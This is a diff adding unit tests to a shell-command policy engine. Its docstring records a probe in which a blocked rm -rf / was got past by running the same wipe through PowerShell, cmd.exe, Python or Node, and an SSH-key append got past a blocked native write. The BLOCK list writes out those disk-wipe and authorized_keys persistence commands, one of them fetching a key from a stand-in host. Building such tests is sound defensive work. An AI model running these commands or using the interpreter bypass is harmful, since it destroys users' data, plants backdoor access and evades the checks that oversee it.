@@ -264,3 +264,60 @@ class TestDdToADisk(unittest.TestCase):
 
 if __name__ == "__main__":
     unittest.main()
+
+
+class TestRootWipeInOtherLanguages(unittest.TestCase):
+    """2026-11-10 proxy probe: rm -rf / was blocked, but the same wipe through
+    PowerShell, cmd.exe, Python or Node passed, and a shell append to
+    authorized_keys passed although a native Write to it is blocked."""
+
+    BLOCK = {
+        "destructive-command": [
+            "Remove-Item -Recurse -Force C:\\",
+            'pwsh -c "Remove-Item -Path / -Recurse -Force"',
+            "Remove-Item $env:USERPROFILE -Recurse -Force",
+            "ri -r -fo C:\\Users\\bob",
+            "rd /s /q C:\\",
+            "rmdir /s /q %USERPROFILE%",
+            "python3 -c 'import shutil; shutil.rmtree(\"/\")'",
+            'python3 -c "import shutil; shutil.rmtree(\\"/home/me\\")"',
+            "python -c 'import shutil,os; shutil.rmtree(os.path.expanduser(\"~\"))'",
+            "python -c 'import shutil,pathlib; shutil.rmtree(pathlib.Path.home())'",
+            "node -e \"require('fs').rmSync('/', {recursive:true, force:true})\"",
+            "node -e \"require('fs').rmSync(require('os').homedir(),{recursive:true})\"",
+        ],
+        "persistence-ssh-authorized-keys": [
+            "echo 'ssh-ed25519 AAAA x' >> ~/.ssh/authorized_keys",
+            "curl -s https://x.example/k | tee -a /root/.ssh/authorized_keys",
+            "cp /tmp/k ~/.ssh/authorized_keys",
+            'cat key.pub > "$HOME/.ssh/authorized_keys"',
+        ],
+    }
+    ALLOW = [
+        "python3 -c 'import shutil; shutil.rmtree(\"build\")'",
+        "python -c 'import shutil; shutil.rmtree(\"/tmp/x\")'",
+        "python -c 'import shutil; shutil.rmtree(\"/home/me/proj/dist\")'",
+        "Remove-Item -Recurse -Force .\\node_modules",
+        "Remove-Item -Recurse -Force C:\\Users\\bob\\proj\\build",
+        "rd /s /q build",
+        "del /s /q *.log",
+        "node -e \"require('fs').rmSync('dist',{recursive:true})\"",
+        "cat ~/.ssh/authorized_keys",
+        "chmod 600 ~/.ssh/authorized_keys",
+        "grep ed25519 ~/.ssh/authorized_keys",
+        "ssh-copy-id user@host",
+    ]
+    NEW = ("destructive-command", "persistence-ssh-authorized-keys")
+
+    def test_blocked(self):
+        eng = PolicyEngine()
+        for rule, cmds in self.BLOCK.items():
+            for cmd in cmds:
+                with self.subTest(cmd=cmd):
+                    self.assertIn(rule, _shell(eng, cmd))
+
+    def test_benign_lookalikes_pass(self):
+        eng = PolicyEngine()
+        for cmd in self.ALLOW:
+            with self.subTest(cmd=cmd):
+                self.assertFalse(set(self.NEW) & set(_shell(eng, cmd)))
